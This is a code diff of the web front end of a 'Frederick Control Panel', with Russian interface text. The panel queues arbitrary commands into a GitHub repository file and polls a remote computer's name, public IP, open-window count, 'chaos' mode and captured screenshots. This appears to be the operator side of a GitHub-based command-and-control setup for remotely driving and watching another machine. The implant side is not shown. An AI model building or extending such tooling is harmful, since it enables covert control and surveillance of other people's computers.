-            entry.innerHTML = `<span class="time">[${time}]</span> <span class="type-${type}">${text}</span>`;
-            logArea.prepend(entry);
-            if (logArea.children.length > 100) {
-                logArea.removeChild(logArea.lastChild);
-            }
+        const err = await writeResp.json().catch(() => ({}));
+        if ((err.message || '').includes('does not match') && retryCount < 3) {
+          addLog('info', `🔄 Конфликт, повтор ${retryCount + 1}/3...`);
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          return sendCmd(cmd, retryCount + 1);
         }
+        addLog('error', err.message || `Ошибка отправки: ${writeResp.status}`);
+      } catch (error) {
+        addLog('error', error.message);
+      }
+    }
 
-        async function fetchLogs() {
-            try {
-                const resp = await fetch(RAW_URL + 'logs/');
-                if (resp.ok) {
-                    const html = await resp.text();
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(html, 'text/html');
-                    const links = doc.querySelectorAll('a');
-                    let found = false;
-                    for (const link of links) {
-                        if (link.href.includes('.json')) {
-                            const logFile = link.href.split('/').pop();
-                            const logResp = await fetch(RAW_URL + 'logs/' + logFile);
-                            if (logResp.ok) {
-                                const data = await logResp.json();
-                                const logArea = document.getElementById('logArea');
-                                logArea.innerHTML = '';
-                                data.reverse().forEach(entry => {
-                                    addLog(entry.type || 'info', entry.text);
-                                });
-                                found = true;
-                                break;
-                            }
-                        }
-                    }
-                    if (!found) {
-                        addLog('info', '📭 No log files found');
-                    }
-                } else {
-                    addLog('error', '❌ Cannot fetch logs');
-                }
-            } catch(e) {
-                addLog('error', `❌ ${e.message}`);
-            }
+    function sendCustomCmd() {
+      const input = document.getElementById('customCmd');
+      const cmd = input.value.trim();
+      if (!cmd) return;
+      input.value = '';
+      sendCmd(cmd);
+    }
+
+    function addLog(type, text) {
+      const logArea = document.getElementById('logArea');
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.innerHTML = `<span class="time">[${new Date().toLocaleTimeString()}]</span><span class="type-${sanitize(type)}">${sanitize(text)}</span>`;
+      logArea.prepend(entry);
+      while (logArea.children.length > 120) logArea.removeChild(logArea.lastChild);
+    }
+
+    async function fetchLogs() {
+      try {
+        addLog('info', 'Загрузка логов...');
+        const resp = await fetch(RAW_URL + 'logs/');
+        if (!resp.ok) throw new Error('Список логов не доступен');
+        const html = await resp.text();
+        const doc = new DOMParser().parseFromString(html, 'text/html');
+        const jsonLink = [...doc.querySelectorAll('a')].find(link => link.href.includes('.json'));
+        if (!jsonLink) {
+          addLog('info', 'Логи не найдены.');
+          return;
         }
+        const logFile = jsonLink.href.split('/').pop();
+        const logResp = await fetch(RAW_URL + 'logs/' + logFile);
+        if (!logResp.ok) throw new Error('Не удалось открыть лог');
+        const data = await logResp.json();
+        document.getElementById('logArea').innerHTML = '';
+        [...data].reverse().forEach(entry => addLog(entry.type || 'info', entry.text || JSON.stringify(entry)));
+        addLog('success', `Загружено ${data.length} записей`);
+      } catch (error) {
+        addLog('error', error.message);
+      }
+    }
 
-        async function fetchStatus() {
-            try {
-                const resp = await fetch(RAW_URL + 'status.json');
-                if (resp.ok) {
-                    const status = await resp.json();
-                    document.getElementById('pcName').textContent = status.pc_name || '-';
-                    document.getElementById('ipAddress').textContent = status.public_ip || '-';
-                    document.getElementById('windowCount').textContent = status.windowCount || 0;
-                    document.getElementById('chaosStatus').textContent = status.chaosActive ? '🔥 ON' : 'OFF';
-                    document.getElementById('chaosStatus').style.color = status.chaosActive ? '#ff6600' : '#00ff41';
-                    document.getElementById('aeroStatus').textContent = status.aeroInstalled ? '✅' : 'OFF';
-                    addLog('success', `📊 Status updated: ${status.windowCount} windows`);
-                } else {
-                    addLog('info', '📊 Status file not found yet');
-                }
-            } catch(e) {
-                addLog('error', `❌ ${e.message}`);
-            }
+    async function fetchStatus() {
+      try {
+        const resp = await fetch(RAW_URL + 'status.json', { cache: 'no-store' });
+        if (!resp.ok) {
+          addLog('info', 'Файл статуса не найден.');
+          return;
         }
+        const status = await resp.json();
+        document.getElementById('pcName').textContent = status.pc_name || '—';
+        document.getElementById('ipAddress').textContent = status.public_ip || '—';
+        document.getElementById('windowCount').textContent = status.windowCount ?? 0;
+        document.getElementById('chaosStatus').textContent = status.chaosActive ? '🔥 ON' : 'OFF';
+        document.getElementById('chaosStatus').style.color = status.chaosActive ? '#f59e0b' : '#93a4b8';
+        document.getElementById('aeroStatus').textContent = status.aeroInstalled ? '✅ ON' : 'OFF';
+        document.getElementById('aeroStatus').style.color = status.aeroInstalled ? '#34d399' : '#93a4b8';
+        addLog('success', `📊 Статус обновлён. Окон: ${status.windowCount ?? 0}`);
+      } catch (error) {
+        addLog('error', error.message);
+      }
+    }
 
-        async function fetchFiles() {
-            try {
-                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/`);
-                if (resp.ok) {
-                    const files = await resp.json();
-                    const browser = document.getElementById('fileBrowser');
-                    browser.innerHTML = '';
-                    files.forEach(file => {
-                        if (file.type === 'file') {
-                            const div = document.createElement('div');
-                            div.className = 'file-item';
-                            div.innerHTML = `
-                                <span>📄 ${file.name}</span>
-                                <span class="size">${(file.size / 1024).toFixed(1)} KB</span>
-                            `;
-                            div.onclick = () => window.open(file.download_url, '_blank');
-                            browser.appendChild(div);
-                        } else if (file.type === 'dir') {
-                            const div = document.createElement('div');
-                            div.className = 'file-item';
-                            div.innerHTML = `<span>📁 ${file.name}/</span>`;
-                            browser.appendChild(div);
-                        }
-                    });
-                }
-            } catch(e) {
-                document.getElementById('fileBrowser').innerHTML = `<div style="color:#ff0040;">❌ ${e.message}</div>`;
-            }
+    async function fetchFiles() {
+      const browser = document.getElementById('fileBrowser');
+      browser.innerHTML = '<div class="empty">Загрузка...</div>';
+      try {
+        const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/`);
+        if (!resp.ok) throw new Error('Не удалось получить список файлов');
+        const files = await resp.json();
+        browser.innerHTML = '';
+        document.getElementById('fileCount').textContent = `${files.length} объектов`;
+        files.forEach(file => {
+          const row = document.createElement('div');
+          row.className = 'file-item';
+          row.innerHTML = `<span>${file.type === 'dir' ? '📁' : '📄'} ${sanitize(file.name)}${file.type === 'dir' ? '/' : ''}</span><span class="size">${file.type === 'file' ? (file.size / 1024).toFixed(1) + ' KB' : ''}</span>`;
+          if (file.download_url) row.onclick = () => window.open(file.download_url, '_blank', 'noopener,noreferrer');
+          browser.appendChild(row);
+        });
+      } catch (error) {
+        browser.innerHTML = `<div class="empty">${sanitize(error.message)}</div>`;
+      }
+    }
+
+    async function fetchScreenshots() {
+      const grid = document.getElementById('mediaGrid');
+      grid.innerHTML = '<div class="empty">Загрузка...</div>';
+      try {
+        const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/outputs/images`);
+        if (!resp.ok) throw new Error('Медиа не найдены');
+        const files = await resp.json();
+        grid.innerHTML = '';
+        const images = files.filter(file => file.type === 'file' && /\.(png|jpe?g|webp|gif)$/i.test(file.name));
+        document.getElementById('mediaCount').textContent = `${images.length} файлов`;
+        if (!images.length) {
+          grid.innerHTML = '<div class="empty">Изображения не найдены</div>';
+          return;
         }
+        images.forEach(file => {
+          const item = document.createElement('div');
+          item.className = 'media-item';
+          item.innerHTML = `<img src="${file.download_url}" alt="${sanitize(file.name)}" loading="lazy"><div class="label">${sanitize(file.name)}</div>`;
+          grid.appendChild(item);
+        });
+        addLog('success', `Загружено ${images.length} изображений`);
+      } catch (error) {
+        grid.innerHTML = `<div class="empty">${sanitize(error.message)}</div>`;
+      }
+    }
 
-        async function fetchScreenshots() {
-            try {
-                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/outputs/images`);
-                if (resp.ok) {
-                    const files = await resp.json();
-                    const grid = document.getElementById('mediaGrid');
-                    grid.innerHTML = '';
-                    let count = 0;
-                    for (const file of files) {
-                        if (file.type === 'file' && (file.name.endsWith('.png') || file.name.endsWith('.jpg') || file.name.endsWith('.jpeg'))) {
-                            const div = document.createElement('div');
-                            div.className = 'media-item';
-                            div.innerHTML = `
-                                <img src="${file.download_url}" alt="${file.name}" loading="lazy">
-                                <div class="label">${file.name}</div>
-                            `;
-                            grid.appendChild(div);
-                            count++;
-                        }
-                    }
-                    if (count === 0) {
-                        grid.innerHTML = '<div style="color:#666;grid-column:1/-1;text-align:center;">No images found</div>';
-                    }
-                } else {
-                    document.getElementById('mediaGrid').innerHTML = '<div style="color:#ff0040;">❌ Cannot fetch media</div>';
-                }
-            } catch(e) {
-                document.getElementById('mediaGrid').innerHTML = `<div style="color:#ff0040;">❌ ${e.message}</div>`;
-            }
-        }
-
-        setInterval(fetchStatus, 30000);
-
-        fetchStatus();
-        addLog('info', '🚀 Frederick Control Panel loaded');
-        addLog('info', '📡 Send commands via the buttons above');
-        addLog('info', `📁 Repo: ${GITHUB_OWNER}/${GITHUB_REPO}`);
-        addLog('info', `📄 Command file: ${COMMAND_FILE}`);
-        addLog('info', `🆔 Next command ID: ${getCommandId() + 1}`);
-
-        async function checkFiles() {
-            try {
-                const resp = await fetch(RAW_URL + COMMAND_FILE);
-                if (resp.ok) {
-                    const data = await resp.json();
-                    if (data.length > 0) {
-                        addLog('info', `📩 Pending commands: ${data.length}`);
-                        data.forEach(cmd => {
-                            addLog('command', `⏳ ${cmd.cmd} (id: ${cmd.id})`);
-                        });
-                    }
-                }
-            } catch(e) {}
-        }
-        checkFiles();
-    </script>
+    // ===== ЗАПУСК =====
+    setInterval(fetchStatus, 30000);
+    addLog('info', '🚀 Frederick Control Panel загружен');
+    addLog('info', `📁 Репозиторий: ${GITHUB_OWNER}/${GITHUB_REPO}`);
+    addLog('info', `🆔 Следующий ID: ${getCommandId() + 1}`);
+    addLog('info', `⏱️ Автоочистка: каждые ${CLEAR_INTERVAL_MS / 60000} мин.`);
+    
+    // Запускаем автоочистку
+    startAutoClear();
+    fetchStatus();
+  </script>
 </body>
 </html>
